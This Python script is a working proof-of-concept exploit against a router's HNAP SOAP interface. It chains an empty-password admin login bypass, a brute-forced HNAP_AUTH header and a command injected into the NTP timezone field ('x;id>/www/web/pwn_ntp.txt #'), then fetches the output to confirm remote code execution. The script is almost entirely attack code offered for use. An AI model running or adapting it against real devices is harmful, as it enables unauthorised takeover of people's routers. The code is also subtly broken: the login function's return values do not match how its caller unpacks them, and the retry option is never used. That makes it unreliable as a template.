#!/usr/bin/env python3

import argparse
import http.client
import re
import sys
import time

SOAP_NS = "http://purenetworks.com/HNAP1/"
SOAP_ENVELOPE_OPEN = (
    '<?xml version="1.0" encoding="utf-8"?>'
    "<soap:Envelope "
    'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
    'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
    'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
    "<soap:Body>"
)
SOAP_ENVELOPE_CLOSE = "</soap:Body></soap:Envelope>"


def soap_post(host, port, action, body, cookie=None, hnap_auth=None, timeout=15):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {
        "Content-Type": "text/xml",
        "SOAPAction": f"{SOAP_NS}{action}",
    }
    if cookie:
        headers["Cookie"] = f"uid={cookie}"
    if hnap_auth:
        headers["HNAP_AUTH"] = hnap_auth
    payload = SOAP_ENVELOPE_OPEN + body + SOAP_ENVELOPE_CLOSE
    conn.request("POST", "/HNAP1/", body=payload, headers=headers)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    status = resp.status
    conn.close()
    return status, data


def xml_text(xml, tag):
    m = re.search(rf"<{tag}>(.*?)</{tag}>", xml, re.S)
    return m.group(1).strip() if m else None


def login_bypass(host, port):
    body1 = (
        "<Login>"
        "<Action>request</Action>"
        "<Username>Admin</Username>"
        "<LoginPassword></LoginPassword>"
        "<Captcha></Captcha>"
        "</Login>"
    )
    status, xml = soap_post(host, port, "Login", body1)
    challenge = xml_text(xml, "Challenge")
    public_key = xml_text(xml, "PublicKey")
    cookie = xml_text(xml, "Cookie")
    captcha = xml_text(xml, "CAPTCHA") or xml_text(xml, "Captcha")
    result1 = xml_text(xml, "LoginResult")

    print(f"[*] step-1 (request) HTTP {status}, LoginResult={result1}")
    print(f"    Challenge : {challenge}")
    print(f"    PublicKey : {public_key}")
    print(f"    Cookie    : {cookie}")
    if captcha:
        print(f"[!] CAPTCHA enabled on target ({captcha!r}) - chain needs a solver")
        return None, None
    if not challenge or not cookie:
        print("[-] no challenge/cookie issued; aborting")
        return None, None

    # strncmp(computed_hmac, "", 0) == 0  =>  admin login without any secret.
    body2 = (
        "<Login>"
        "<Action>login</Action>"
        "<Username>Admin</Username>"
        "<LoginPassword></LoginPassword>"
        "<Captcha></Captcha>"
        "</Login>"
    )
    status, xml = soap_post(host, port, "Login", body2, cookie=cookie)
    result2 = xml_text(xml, "LoginResult")
    print(f"[*] step-2 (login)   HTTP {status}, LoginResult={result2}")

    if result2 != "success":
        return None, None

    print("[+] PRE-AUTH LOGIN BYPASS: authenticated as Admin with empty password")
    return cookie


def fetch_proof(host, port, path, timeout=10):
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request("GET", path)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        conn.close()
        return resp.status, data
    except OSError as e:
        return 0, str(e)


def lottery_auth_inject(host, port):
    action = "SetNTPServerSettings"
    ntp_payload = "x;id>/www/web/pwn_ntp.txt #"
    for attempt in range(1, 65):
        cookie, _ = login_bypass(host, port)
        if not cookie:
            continue
        ts = str(int(time.time() * 1000))
        guess = "0123456789abcdef"[attempt % 16]
        body = f"<system_time_timezone>{ntp_payload}</system_time_timezone>"
        try:
            status, xml = soap_post(
                host,
                port,
                action,
                body,
                cookie=cookie,
                hnap_auth=f"{guess} {ts}",
            )
        except Exception as e:
            print(f"[!] attempt {attempt}: {e}")
            continue
        result = xml_text(xml, action + "Result")
        print(f"[*] lottery {attempt:2d}: code={guess} HTTP {status} Result={result}")
        if status == 200 and result == "OK":
            print(f"[+] HNAP_AUTH lottery won after {attempt} attempts")
            return True
    return False


def main():
    ap = argparse.ArgumentParser(description="DIR-1260 prog.cgi auth-bypass RCE PoC")
    ap.add_argument("--host", default="192.168.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument(
        "--loop",
        type=int,
        default=1,
        help="retry the whole chain N times (fresh login each)",
    )
    args = ap.parse_args()

    print(f"[*] target {args.host}:{args.port}")
    if lottery_auth_inject(args.host, args.port):
        status, data = fetch_proof(args.host, args.port, "/pwn_ntp.txt")
        if status == 200:
            print(f"[+] RCE CONFIRMED: {data.strip()!r}")
            return
    sys.exit("[-] lottery failed")


if __name__ == "__main__":
    main()
